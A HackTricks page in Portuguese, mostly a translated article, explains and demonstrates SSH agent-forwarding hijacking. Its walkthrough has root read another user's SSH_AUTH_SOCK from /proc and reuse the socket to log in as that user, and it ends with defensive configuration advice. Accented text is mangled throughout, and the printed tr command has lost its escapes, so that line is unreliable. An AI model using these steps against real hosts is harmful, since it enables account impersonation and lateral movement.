<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Participe do grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou do grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# Resumo

O que voc√™ pode fazer se descobrir dentro do `/etc/ssh_config` ou dentro da configura√ß√£o `$HOME/.ssh/config` isto:
```
ForwardAgent yes
```
Se voc√™ √© root dentro da m√°quina, provavelmente pode **acessar qualquer conex√£o ssh feita por qualquer agente** que voc√™ encontrar no diret√≥rio _/tmp_

Personificar Bob usando um dos ssh-agent de Bob:
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## Por que isso funciona?

Quando voc√™ define a vari√°vel `SSH_AUTH_SOCK`, voc√™ est√° acessando as chaves de Bob que foram usadas na conex√£o ssh de Bob. Ent√£o, se a chave privada dele ainda estiver l√° (normalmente estar√°), voc√™ poder√° acessar qualquer host usando-a.

Como a chave privada √© salva na mem√≥ria do agente descriptografada, suponho que, se voc√™ for Bob mas n√£o souber a senha da chave privada, ainda poder√° acessar o agente e us√°-lo.

Outra op√ß√£o √© que o usu√°rio propriet√°rio do agente e o root possam acessar a mem√≥ria do agente e extrair a chave privada.

# Explica√ß√£o longa e explora√ß√£o

**Retirado de:** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **Quando ForwardAgent N√£o Pode Ser Confi√°vel**

SSH sem senhas torna a vida com sistemas operacionais semelhantes ao Unix muito mais f√°cil. Se sua rede requer sess√µes ssh encadeadas (para acessar uma rede restrita, por exemplo), o encaminhamento de agente se torna extremamente √∫til. Com o encaminhamento de agente, √© poss√≠vel para mim conectar do meu laptop ao meu servidor de desenvolvimento e de l√° executar um svn checkout de outro servidor, tudo sem senhas, mantendo minha chave privada segura na minha esta√ß√£o de trabalho local.

Isso pode ser perigoso, no entanto. Uma r√°pida pesquisa na web revelar√° v√°rios artigos indicando que isso s√≥ √© seguro se os hosts intermedi√°rios forem confi√°veis. Raramente, no entanto, voc√™ encontrar√° uma explica√ß√£o do _porqu√™_ isso √© perigoso.

√â para isso que serve este artigo. Mas primeiro, um pouco de contexto.

## **Como Funciona a Autentica√ß√£o Sem Senha**

Ao autenticar no modo normal, o SSH usa sua senha para provar que voc√™ √© quem diz ser. O servidor compara um hash desta senha com um que possui em arquivo, verifica se os hashes correspondem e permite sua entrada.

Se um atacante for capaz de quebrar a criptografia usada para proteger sua senha enquanto ela √© enviada ao servidor, ele pode roub√°-la e fazer login como voc√™ quando desejar. Se um atacante for permitido realizar centenas de milhares de tentativas, ele pode eventualmente adivinhar sua senha.

Um m√©todo de autentica√ß√£o muito mais seguro √© a [autentica√ß√£o por chave p√∫blica](http://www.ibm.com/developerworks/library/l-keyc/index.html), uma maneira de fazer login sem uma senha. A autentica√ß√£o por chave p√∫blica requer um par combinado de chaves p√∫blica e privada. A chave p√∫blica criptografa mensagens que s√≥ podem ser descriptografadas com a chave privada. O computador remoto usa sua c√≥pia da sua chave p√∫blica para criptografar uma mensagem secreta para voc√™. Voc√™ prova que √© voc√™ descriptografando a mensagem usando sua chave privada e enviando a mensagem de volta ao computador remoto. Sua chave privada permanece segura em seu computador local o tempo todo, protegida de ataques.

A chave privada √© valiosa e deve ser protegida, portanto, por padr√£o, √© armazenada em um formato criptografado. Infelizmente, isso significa digitar sua frase de acesso de criptografia antes de us√°-la. Muitos artigos sugerem o uso de chaves privadas sem frase de acesso (n√£o criptografadas) para evitar esse inconveniente. Isso √© uma m√° ideia, pois qualquer pessoa com acesso √† sua esta√ß√£o de trabalho (por acesso f√≠sico, roubo ou hackeamento) agora tamb√©m tem acesso livre a qualquer computador configurado com sua chave p√∫blica.

O OpenSSH inclui [ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent), um daemon que √© executado em sua esta√ß√£o de trabalho local. Ele carrega uma c√≥pia descriptografada da sua chave privada na mem√≥ria, para que voc√™ s√≥ tenha que digitar sua frase de acesso uma vez. Ele ent√£o fornece um [socket](http://en.wikipedia.org/wiki/Unix\_domain\_socket) local que o cliente ssh pode usar para pedir que ele descriptografe a mensagem criptografada enviada de volta pelo servidor remoto. Sua chave privada permanece seguramente aconchegada na mem√≥ria do processo ssh-agent enquanto ainda permite que voc√™ se mova por a√≠ com ssh sem digitar senhas.

## **Como Funciona o ForwardAgent**

Muitas tarefas requerem "encadear" sess√µes ssh. Considere meu exemplo anterior: eu fa√ßo ssh do meu workstation para o servidor de desenvolvimento. Enquanto estou l√°, preciso realizar um svn update, usando o protocolo "svn+ssh". Como seria absurdo deixar uma c√≥pia descriptografada da minha chave privada super-secreta em um servidor compartilhado, agora estou preso com autentica√ß√£o por senha. No entanto, se eu habilitasse "ForwardAgent" na configura√ß√£o ssh do meu workstation, o ssh usaria suas capacidades de tunelamento embutidas para criar outro socket no servidor de desenvolvimento que √© tunelado de volta para o socket do ssh-agent na minha esta√ß√£o de trabalho local. Isso significa que o cliente ssh no servidor de desenvolvimento agora pode enviar solicita√ß√µes de "descriptografe esta mensagem secreta" diretamente de volta para o ssh-agent em execu√ß√£o na minha esta√ß√£o de trabalho, autenticando-se ao servidor svn sem nunca ter acesso √† minha chave privada.

## **Por Que Isso Pode Ser Perigoso**

Simplificando, qualquer pessoa com privil√©gio de root no servidor intermedi√°rio pode fazer uso livre do seu ssh-agent para autenticar-se em outros servidores. Uma demonstra√ß√£o simples mostra como isso pode ser feito trivialmente. Nomes de host e usu√°rios foram alterados para proteger os inocentes.

Meu laptop est√° executando ssh-agent, que se comunica com os programas cliente ssh por meio de um socket. O caminho para este socket √© armazenado na vari√°vel de ambiente SSH\_AUTH\_SOCK:
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
O programa [ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add) nos permite visualizar e interagir com chaves no agente:
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Eu tenho "ForwardAgent yes" no \~/.ssh/config no meu laptop. Ent√£o o ssh vai criar um t√∫nel conectando o socket local a um socket local no servidor remoto:
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
Embora minhas chaves n√£o estejam instaladas em "seattle", os programas cliente ssh ainda conseguem acessar o agente em execu√ß√£o na minha m√°quina local:
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Ent√£o... com quem podemos mexer?
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
Eu nunca gostei do Bob. Para encontrar a conex√£o do agente dele, preciso localizar o processo filho de uma das sess√µes ssh dele:
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)‚îÄ‚îÄ‚îÄbash(16817)

sshd(25296)‚îÄ‚îÄ‚îÄbash(25297)‚îÄ‚îÄ‚îÄvim(14308)
```
Existem v√°rias maneiras de o root visualizar o ambiente de um processo em execu√ß√£o. No Linux, os dados est√£o dispon√≠veis em /proc/\<pid>/environ. Como eles s√£o armazenados em strings terminadas em NULL, usarei o tr para converter os NULLs em novas linhas:
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
Agora tenho tudo o que preciso saber para sequestrar o ssh-agent do Bob:
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
Caso eu tenha um alvo espec√≠fico em mente, agora devo ser capaz de me conectar diretamente. Caso contr√°rio, apenas observar a lista de processos ou pesquisar no arquivo de hist√≥rico do Bob deve apresentar v√°rias oportunidades de alvo. Neste caso, sei que o Bob tem todos os tipos de arquivos super secretos armazenados no servidor chamado "boston":
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
## **Proteja-se!**

N√£o permita que seu ssh-agent armazene suas chaves indefinidamente. No OS X, configure seu Keychain para bloquear ap√≥s inatividade ou quando a tela for bloqueada. Em outras plataformas Unix, use a op√ß√£o -t com o ssh-agent para que suas chaves sejam removidas ap√≥s  segundos.

N√£o habilite o encaminhamento de agente ao conectar-se a hosts n√£o confi√°veis. Felizmente, a sintaxe \~/.ssh/config torna isso bastante simples:
```
Host trustworthyhost
ForwardAgent yes
```

```
Host *
ForwardAgent no
```
## **Leitura Recomendada**

* [Gerenciamento de chaves OpenSSH](http://www.ibm.com/developerworks/library/l-keyc/index.html) ‚Äì Daniel Robbins
* [Um Guia Ilustrado para Encaminhamento de Agente SSH](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) ‚Äì Steve Friedl
* [manual do ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [manual do ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
